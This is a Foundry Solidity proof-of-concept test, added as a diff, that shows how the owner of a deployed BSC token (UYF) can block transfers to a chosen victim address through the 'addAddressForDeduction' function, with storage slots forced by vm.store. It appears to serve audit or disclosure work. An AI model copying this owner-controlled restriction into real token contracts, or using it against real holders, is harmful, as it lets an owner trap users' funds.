@@ -1,0 +1,85 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the UYF token based on ABI summary
+interface IUYF {
+    function balanceOf(address tokenOwner) external view returns (uint256);
+    function transfer(address to, uint256 tokens) external returns (bool);
+    function transferFrom(address from, address to, uint256 tokens) external returns (bool);
+    function approve(address spender, uint256 tokens) external returns (bool);
+    function allowance(address tokenOwner, address spender) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function decimals() external view returns (uint256);
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function owner() external view returns (address);
+    function addAddressForDeduction(address _addressToApplyDeductions) external;
+    function removeAddressForDeduction(address _addressToApplyDeductions) external;
+    function transferOwnership(address _newOwner) external;
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address (BSC)
+    address constant TOKEN = 0x6e571032eb3d09e5bd049cc3f4786b8708eaaedb;
+    // Owner as set in constructor
+    address constant OWNER = 0xC2ece87Bf6f6CF07F4326b191990165A53e0eaA6;
+    // Victim address
+    address constant VICTIM = address(0xdead);
+    // Another address for a normal transfer
+    address constant OTHER = address(0xbeef);
+
+    function setUp() public {
+        // Label addresses for readability
+        vm.label(TOKEN, "UYF Token");
+        vm.label(OWNER, "Owner");
+        vm.label(VICTIM, "Victim");
+        vm.label(OTHER, "Other");
+
+        // Fund the victim with some tokens from the owner
+        IUYF token = IUYF(TOKEN);
+        vm.prank(OWNER);
+        token.transfer(VICTIM, 1000 * 1e18);
+    }
+
+    function testOwnerCanRestrictTransfersToUser() public {
+        IUYF token = IUYF(TOKEN);
+
+        // --- Baseline: Before any malicious action, normal transfers work ---
+        // Victim transfers a portion to OTHER
+        vm.prank(VICTIM);
+        token.transfer(OTHER, 100 * 1e18);
+        assertEq(token.balanceOf(OTHER), 100 * 1e18);
+
+        // --- Owner marks VICTIM as a deductions-applicable address ---
+        vm.prank(OWNER);
+        token.addAddressForDeduction(VICTIM);
+
+        // --- Manipulate totalSupply to be just above minSupply (30M) ---
+        // This forces the deduction to be large (totalSupply - minSupply) for transfers to VICTIM
+        // The deduction becomes so large that any reasonable transfer amount is less than it,
+        // causing an underflow revert.
+        uint256 minSupply = 30_000_000 * 1e18;               // _minSupply constant
+        uint256 smallGap = 1e18;                              // 1 token
+        uint256 adjustedTotalSupply = minSupply + smallGap;   // totalSupply close to minSupply
+
+        // _totalSupply is in slot 4 (after Owned.owner at slot 0, symbol, name, decimals)
+        vm.store(TOKEN, bytes32(uint256(4)), bytes32(adjustedTotalSupply));
+
+        // Also ensure _minSupply is set correctly (slot 5)
+        vm.store(TOKEN, bytes32(uint256(5)), bytes32(minSupply));
+
+        // --- Attempt to transfer a small amount to VICTIM; it should revert ---
+        vm.prank(OWNER);   // OWNER has plenty of tokens
+        vm.expectRevert(); // underflow because tokens < deduction
+        token.transfer(VICTIM, 0.5 * 1e18); // 0.5 token < deduction of 1 token
+
+        // --- Verify that normal transfers to OTHER (not marked) still work ---
+        vm.prank(OWNER);
+        token.transfer(OTHER, 1e18);
+        assertEq(token.balanceOf(OTHER), 101 * 1e18); // previous 100 + 1
+    }
+}
+```
